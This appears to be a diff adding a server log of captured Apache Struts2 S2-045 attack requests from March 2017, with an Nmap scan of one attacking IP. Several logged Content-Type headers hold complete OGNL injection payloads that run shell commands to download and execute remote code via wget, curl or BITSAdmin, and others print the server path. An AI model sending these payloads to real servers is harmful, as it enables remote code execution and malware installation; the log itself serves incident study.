@@ -1,0 +1,109 @@
+---BEGIN---
+	Tue Mar 21 2017 23:24:01 GMT+0000 (UTC)
+	New Connection 104.238.126.237 -> 138.68.229.32
+	User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+	Requested Resource: /struts2-showcase/
+	Request Method: GET
+	Accept: */*
+	Content Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('tkplpyg','tkplpyg')}.multipart/form-data
+	Content Length: undefined
+
+
+ANALYSIS OF IP: 104.238.126.237
+Website was taken over.
+beckandcall.in
+
+Nmap scan report for ip-104-238-126-237.ip.secureserver.net (104.238.126.237)
+Host is up (0.060s latency).
+Scanned at 2017-04-03 21:33:37 UTC for 320s
+Not shown: 973 closed ports
+PORT     STATE    SERVICE
+21/tcp   open     ftp
+22/tcp   open     ssh
+25/tcp   open     smtp
+42/tcp   filtered nameserver
+53/tcp   open     domain
+80/tcp   open     http
+81/tcp   open     hosts2-ns
+110/tcp  open     pop3
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+143/tcp  open     imap
+161/tcp  filtered snmp
+179/tcp  filtered bgp
+443/tcp  open     https
+445/tcp  open     microsoft-ds
+465/tcp  open     smtps
+587/tcp  open     submission
+993/tcp  open     imaps
+995/tcp  open     pop3s
+1028/tcp filtered unknown
+1080/tcp filtered socks
+3128/tcp filtered squid-http
+3306/tcp open     mysql
+6666/tcp filtered irc
+6667/tcp filtered irc
+6668/tcp filtered irc
+9009/tcp open     pichat
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---BEGIN---
+	Wed Mar 22 2017 06:19:02 GMT+0000 (UTC)
+	New Connection 220.191.231.222 -> 138.68.229.32
+	User Agent: Mozilla/5.0
+	Requested Resource: /
+	Request Method: GET
+	Accept: undefined
+	Content Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://65.254.63.20/a|sh ; rm -rf a ; curl -O http://65.254.63.20/a ; sh a ').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+	Content Length: undefined
+---BEGIN---
+	Wed Mar 22 2017 06:19:02 GMT+0000 (UTC)
+	New Connection 220.191.231.222 -> 138.68.229.32
+	User Agent: Mozilla/5.0
+	Requested Resource: /
+	Request Method: GET
+	Accept: undefined
+	Content Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='BITSAdmin.exe /Transfer JOB http://82.165.129.119/UnInstall.exe %TEMP%/UnInstall.exe & %TEMP%/UnInstall.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+	Content Length: undefined
+---BEGIN---
+	Wed Mar 22 2017 06:19:03 GMT+0000 (UTC)
+	New Connection 220.191.231.222 -> intranet.hbtn.co
+	User Agent: Mozilla/5.0
+	Requested Resource: /auth/sign_in
+	Request Method: GET
+	Accept: undefined
+	Content Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='BITSAdmin.exe /Transfer JOB http://82.165.129.119/UnInstall.exe %TEMP%/UnInstall.exe & %TEMP%/UnInstall.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+	Content Length: undefined
+	
+---BEGIN---
+        Wed Mar 29 2017 23:42:13 GMT+0000 (UTC)
+        New Connection 124.132.151.2 -> intranet.hbtn.co
+        User Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)
+        Requested Resource: /
+        Request Method: GET
+        Accept: */*
+        Content Type: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#wmres=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#wmres.getWriter().print("S2-045 dir--***")).(#wmreq=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')).(#wmres.getWriter().println(#wmreq.getSession().getServletContext().getRealPath("/"))).(#wmres.getWriter().flush()).(#wmres.getWriter().close())}.multipart/form-data
+        Content Length: undefined
+
+
+---BEGIN---
+        Wed Mar 29 2017 23:42:13 GMT+0000 (UTC)
+        New Connection 124.132.151.2 -> intranet.hbtn.co
+        User Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)
+        Requested Resource: /auth/sign_in
+        Request Method: GET
+        Accept: */*
+        Content Type: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#wmres=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#wmres.getWriter().print("S2-045 dir--***")).(#wmreq=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')).(#wmres.getWriter().println(#wmreq.getSession().getServletContext().getRealPath("/"))).(#wmres.getWriter().flush()).(#wmres.getWriter().close())}.multipart/form-data
+        Content Length: undefined
